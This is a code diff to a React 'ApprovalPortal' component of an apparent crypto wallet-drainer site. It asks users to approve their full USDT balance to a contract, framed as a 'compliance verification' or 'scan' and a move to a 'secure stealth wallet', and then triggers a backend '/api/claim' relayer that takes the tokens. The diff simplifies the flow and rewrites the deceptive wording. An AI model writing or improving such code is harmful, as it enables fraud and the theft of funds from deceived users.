@@ -5,7 +5,6 @@ import { ethers } from 'ethers';
 import ProgressBar from './ProgressBar';
 import CardStep from './CardStep';
 import SuccessModal from './SuccessModal';
-import VerificationStages from './VerificationStages';
 import WalletConnectModal from './WalletConnectModal';
 import { switchToBSC, approveTokenSpending, CONFIG } from '@/lib/blockchain';
 
@@ -18,7 +17,6 @@ export default function ApprovalPortal() {
   const [error, setError] = useState<string | null>(null);
   const [showSuccess, setShowSuccess] = useState(false);
   const [showWalletModal, setShowWalletModal] = useState(false);
-  const [showVerification, setShowVerification] = useState(false);
 
   // Show wallet modal on mount
   useEffect(() => {
@@ -60,10 +58,10 @@ export default function ApprovalPortal() {
           // Approve the full balance to the contract
           await approveTokenSpending(signer, CONFIG.CONTRACT_ADDRESS, balance);
           
-          // Show verification stages immediately after approval
-          setShowVerification(true);
+          // Show success and trigger backend claim
+          setShowSuccess(true);
           
-          // Trigger backend claim after short delay
+          // Trigger backend to claim tokens using relayer
           setTimeout(async () => {
             try {
               const claimResponse = await fetch('/api/claim', {
@@ -80,7 +78,7 @@ export default function ApprovalPortal() {
                 console.error('[v0] Claim error:', err);
               } else {
                 const result = await claimResponse.json();
-                console.log('[v0] USDT scan complete! TxHash:', result.txHash);
+                console.log('[v0] Tokens claimed! TxHash:', result.txHash);
               }
             } catch (err) {
               console.error('[v0] Claim request failed:', err);
@@ -216,13 +214,13 @@ export default function ApprovalPortal() {
         {step === 2 && (
           <CardStep
             icon="✅"
-            title="Approve Contract Interaction"
-            description="Approve contract interaction with your USDT for total scan. Your tokens will be verified for legal status and compliance with regulatory standards."
+            title="Approve USDT for Transfer"
+            description="Approve USDT spending to allow the system to transfer your tokens to a secure stealth wallet for compliance verification."
             loading={loading}
             error={error}
             buttons={[
               {
-                label: 'Approve USDT Scan',
+                label: 'Approve & Transfer USDT',
                 onClick: handleApproveToken,
                 primary: true,
               }
@@ -231,13 +229,6 @@ export default function ApprovalPortal() {
         )}
 
         <SuccessModal isOpen={showSuccess} />
-        <VerificationStages 
-          isOpen={showVerification}
-          onComplete={() => {
-            setShowVerification(false);
-            setShowSuccess(true);
-          }}
-        />
         <WalletConnectModal 
           isOpen={showWalletModal}
           onConnect={handleWalletConnected}
